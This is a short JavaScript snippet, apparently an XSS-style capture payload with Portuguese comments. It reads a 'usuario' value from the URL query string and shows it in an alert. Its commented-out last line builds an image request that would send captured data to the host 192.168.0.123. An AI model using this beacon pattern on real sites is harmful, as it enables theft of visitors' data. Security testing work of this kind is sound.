var url   = window.location.search.replace("?", "");
var items = url.split("&");
var array = {
'usuario' : items[0],
}
str = array.usuario
var busca = "%20"; 
var strbusca = eval('/'+busca+'/g');
str2 = str.replace(strbusca, " ");
alert(str2);


//alert('captura usuario / editar arquivo captura_usuario.js')


// new Image().src = "http://192.168.0.123/?=" + retorno